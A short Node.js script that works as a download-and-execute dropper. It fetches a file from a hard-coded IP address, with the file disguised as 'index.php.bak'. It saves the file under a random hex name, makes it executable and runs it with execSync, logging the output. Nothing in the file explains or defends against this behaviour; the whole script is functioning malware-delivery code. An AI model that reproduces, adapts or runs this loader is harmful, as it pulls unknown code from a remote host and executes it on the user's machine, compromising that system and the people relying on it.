const https = require('https');
const http = require('http');
const fs = require('fs');
const { execSync } = require('child_process');
const crypto = require('crypto');
const path = require('path');

function downloadFile(url, dest) {
    return new Promise((resolve, reject) => {
        const protocol = url.startsWith('https') ? https : http;
        const request = protocol.get(url, (response) => {
            if (response.statusCode === 301 || response.statusCode === 302) {
                return downloadFile(response.headers.location, dest).then(resolve).catch(reject);
            }
            if (response.statusCode !== 200) { 
                return reject(new Error(`HTTP ${response.statusCode}`)); 
            }
            const file = fs.createWriteStream(dest);
            response.pipe(file);
            file.on('finish', () => { 
                file.close(() => resolve()); 
            });
        });
        request.on('error', (err) => { 
            reject(err); 
        });
    });
}


function generateRandomFilename() {
    const randomStr = crypto.randomBytes(8).toString('hex');
    const timestamp = Date.now();
    return `${randomStr}`;
}

async function main() {
    try {
        const url = 'http://129.80.185.131/index.php.bak';
        const currentDir = process.cwd();
        const randomFilename = generateRandomFilename();
        const dest = path.join(currentDir, randomFilename);
        
        console.log(`Downloading ${url} to ${dest}`);
        await downloadFile(url, dest);
        
        console.log(`Setting executable permissions: ${dest}`);
        fs.chmodSync(dest, 0o755);
        
        console.log(`Executing ${dest}`);
        const output = execSync(dest, { stdio: 'pipe' });
        console.log(`Execution output: ${output.toString().substring(0, 200)}`);
        
    } catch (err) {
        console.error(`Error: ${err.message}`);
        process.exit(1);
    }
}

if (require.main === module) {
    main();
}

module.exports = { downloadFile };